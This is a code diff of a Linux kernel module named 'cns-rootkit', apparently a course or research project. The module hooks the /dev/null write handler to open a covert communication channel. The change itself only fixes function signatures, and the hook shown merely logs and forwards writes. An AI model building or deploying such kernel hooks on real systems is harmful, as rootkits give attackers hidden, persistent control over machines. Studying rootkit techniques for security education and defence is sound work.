@@ -6,19 +6,17 @@
 MODULE_LICENSE("MIT");
 MODULE_AUTHOR("SAV");
 
-int establish_comm_channel();
-int unestablish_comm_channel();
-ssize_t *cns_rootkit_dev_null_write(struct file *, char __user *, size_t, loff_t *);
+ssize_t cns_rootkit_dev_null_write(struct file *, char __user *, size_t, loff_t *);
 
 
 ssize_t (*original_dev_null_write) (struct file *, char __user *, size_t, loff_t *);
 
-ssize_t *cns_rootkit_dev_null_write(struct file *filep, char __user *buf, size_t count, loff_t *p) {
+ssize_t cns_rootkit_dev_null_write(struct file *filep, char __user *buf, size_t count, loff_t *p) {
   printk(KERN_INFO "cns-rootkit: In my /dev/null write\n");
   return original_dev_null_write(filep, buf, count, p);
 }
 
-int establish_comm_channel() {
+int establish_comm_channel(void) {
   printk(KERN_INFO "cns-rootkit: Attempting to establish communication channel\n");
   struct file *dev_null_file;
   if((dev_null_file = filp_open("/dev/null", O_RDONLY, 0)) == NULL) {
@@ -36,7 +34,7 @@ int establish_comm_channel() {
   return 0;
 }
 
-int unestablish_comm_channel() {
+int unestablish_comm_channel(void) {
   printk(KERN_INFO "cns-rootkit: Attempting to unestablish communication channel\n");
   struct file *dev_null_file;
   if((dev_null_file = filp_open("/dev/null", O_RDONLY, 0)) == NULL) {
